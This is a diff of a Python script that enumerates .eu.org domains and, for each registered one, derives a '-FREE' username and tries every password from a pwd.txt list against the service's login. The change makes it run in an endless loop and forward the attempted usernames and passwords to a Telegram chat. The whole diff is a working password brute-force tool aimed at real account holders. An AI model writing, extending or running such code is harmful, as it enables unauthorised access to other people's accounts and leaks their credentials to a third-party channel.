@@ -48,46 +48,31 @@ def write_regist(path, text):
     with open(path, 'a', encoding='utf-8') as f:
         f.write(text + '\n')
 
-
+from gen_str_dpseek import perform
 def main():
     example = Euorg()
-    pool = ThreadPoolExecutor(max_workers=8)
 
     # 读取字典
-    f = open('./zidian.txt')
-    domain = f.read().splitlines()
-    f.close()
-    domains = [i + '.eu.org' for i in domain]
+    # f = open('./zidian.txt')
+    # domain = f.read().splitlines()
+    # f.close()
 
+    new_str = perform()
+    dom = new_str + '.eu.org'
+    print('-------------------')
+    print(f'current domain: {dom}')
     # 记录结果
-    results = pool.map(example.scan, domains)
-    # 代表数组下标
-    flag = 0
+    results = example.scan(dom)
 
-    # 未注册
-    noregist = []
-    # 已注册
-    regist = []
-    # 总长度
-    sumlength = len(domain)
     # 打印结果
-    for i in results:
-        print(f'{(flag + 1) / sumlength:.2%} : {flag + 1} / {sumlength} >>> {domains[flag]}\t', i)
-        if i is None:
-            noregist.append(domains[flag])
-            write_regist('./noregist.txt', domains[flag])
-        else:
-            regist.append(domains[flag] + '\t' + i)
-            write_regist('./regist.txt', domains[flag] + '\t' + i)
+    if results is None:
+        print(f'euorg scan: {dom}\t {results}')
+        write_regist('./noregist.txt', dom)
+    else:
+        write_regist('./regist.txt', dom + '\t' + results)
+        mixUserInfo(results)
 
-            mixUserInfo(domains[flag], i)
-        # 保存已经扫描的域名
-        write_regist('./passed.txt', domains[flag])
-        flag = flag + 1
-
-
-def mixUserInfo(domain, user):
-    print(f'domain: {domain}, user: {user}')
+def mixUserInfo(user):
     userName = user + '-FREE'
     with open('pwd.txt', 'r', encoding='utf-8') as file:
         lines = file.readlines()
@@ -97,7 +82,7 @@ def mixUserInfo(domain, user):
                 login(userName, pwd)
                 time.sleep(5)
             except Exception as e:
-                send_telegram_message(f"登录失败！username: {userName}, password: {pwd}, error: {e.__cause__}")
+                send_telegram_message(f"登录失败！username: {userName}, password: {pwd}")
                 sleep(1000)
                 continue
 
@@ -156,12 +141,8 @@ def login(user, pwd):
     else:
         print("登录失败，状态码:", response.status_code)
 
-
 if __name__ == '__main__':
     print('>>> 开始运行~')
-    # 计算时间
-    start_time = time.time()
-    main()
-    now_time = time.time()
-    print(f'\n>>> 运行结束，共耗时 {now_time - start_time:.2f} 秒。所得运行结果，在当前所在目录下，请查收。\n')
-    input('>>> 按任意键退出……')
+    while True:
+        main()
+
